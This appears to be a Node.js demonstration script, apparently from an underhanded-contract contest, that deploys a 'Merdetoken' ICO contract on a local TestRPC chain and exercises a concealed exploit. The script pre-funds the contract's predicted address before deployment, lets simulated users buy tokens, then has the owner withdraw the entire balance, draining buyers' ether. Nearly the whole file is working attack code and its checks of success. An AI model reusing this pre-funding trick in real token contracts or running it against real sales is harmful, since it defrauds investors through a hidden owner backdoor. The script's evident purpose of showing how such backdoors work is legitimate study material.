'use strict';

var fs = require('fs');

var solc = require('solc');
var ethers = require('ethers');
var TestRPC = require('ethereumjs-testrpc');

// Useful for debugging async code
process.on('unhandledRejection', function(reason, p){
    console.log("Possibly Unhandled Rejection at: Promise ", p, " reason: ", reason);
});

// Should we run this code with the exploit enabled?
// /Users/contest> node try-it.out.js [no-exploit]
var enableExploit = (process.argv.length < 3 || process.argv[2] !== 'no-exploit');

// Duration of the presale (in seconds)
var Duration = 20;


var testRPCServer = TestRPC.server();


function runTest(provider, enableExploit) {

    // Compile the contract
    var sources = {
        'Merdetoken.sol': fs.readFileSync('./Merdetoken.sol').toString()
    };
    var contract = solc.compile({ sources: sources }, 1).contracts['Merdetoken.sol:Merdetoken'];


    // These will be filled in during the promises
    var tx = null;
    var contractAddress = null;
    var tokenContract = null;


    var seq = Promise.resolve();


    // Prepare the deployment transaction and compute future contract address
    seq = seq.then(function() {
        tx = ethers.Contract.getDeployTransaction(
            '0x' + contract.bytecode,
            contract.interface,
            Duration
        );

        tx.gasPrice = 20000000000;
        tx.gasLimit = 1500000
        tx.from = provider.accounts[0].address;
        return provider.accounts[0].getTransactionCount();

    }).then(function(nonce) {
        tx.nonce = nonce;
        contractAddress = ethers.utils.getContractAddress(tx);

        // The token contract (with the ICO owner as the signer)
        tokenContract = new ethers.Contract(contractAddress, contract.interface, provider.accounts[0]);
    });


    // The sinister part...
    if (enableExploit) {
        seq = seq.then(function() {
            var wei = ethers.utils.parseEther('3.14159');
            return provider.accounts[1].send(contractAddress, wei);
        });
    }


    // Deploy the contract
    seq = seq.then(function() {
        return provider.accounts[0].sendTransaction(tx);
    });


    // Buy tokens with accounts 3 through 9 (the legitimate users)
    seq = seq.then(function() {
        var buyTokens = [];
        var weiE = ethers.utils.parseEther('2.71828')
        for (var i = 3; i < 9; i++) {
            buyTokens.push(provider.accounts[i].send(contractAddress, weiE.mul(i)));
        }

        return Promise.all(buyTokens);
    });


    // Quick check on the balance and total supply
    // If the balance is larger than the total supply, our exploit is working
    seq = seq.then(function() {
        return Promise.all([
            provider.getBalance(contractAddress),
            tokenContract.totalSupply()
        ]).then(function(result) {
            console.log('If the balance is larger than the total supply, attack is successful:');
            console.log('  - Balance:      ', ethers.utils.formatEther(result[0]));
            console.log('  - Total Supply: ', ethers.utils.formatEther(result[1].totalSupply));
        });
    });


    // Wait until the ICO has activated, after Duration seconds
    seq = seq.then(function() {
        console.log('Waiting for ' + Duration + ' seconds... (so the ICO presale ends and it activates)');
        return new Promise(function(resolve) {
            setTimeout(function() {
                resolve();
            }, (Duration + 4) * 1000);
        });
    });


    // Attack! (check the balance before and after)
    seq = seq.then(function() {
        // The balance before
        return provider.getBalance(contractAddress);
    }).then(function(balance) {
        console.log('If the balance after is 0, the attack was successful:');
        console.log('  - Balance Before: ', ethers.utils.formatEther(balance));

        // Withdraw the whole balance (we should only be able to access a small amount)
        return tokenContract.withdraw(balance).catch(function(error) {
            console.log('  - Failed to execute attack.');
        });
    }).then(function() {
        // The balance after
        return provider.getBalance(contractAddress);
    }).then(function(balance) {
        console.log('  - Balance After:  ', ethers.utils.formatEther(balance));
    });


    // Shutdown the TestRPC server
    seq = seq.then(function() {
        testRPCServer.close();
    });
}


// Start a TestRPC server and begin the above test
testRPCServer.listen(18549, function(error, blockchain) {
    if (error) {
        console.log('Error starting TestRPC:', error);
    } else {
        var provider = new ethers.providers.JsonRpcProvider('http://localhost:18549');
        provider.shutdown = function() { testRPCServer.close(); };
        provider.accounts = [];
        for (var address in blockchain.accounts) {
            var account = blockchain.accounts[address];
            provider.accounts.push(new ethers.Wallet(account.secretKey, provider));
        }
        runTest(provider, enableExploit);
    }
});

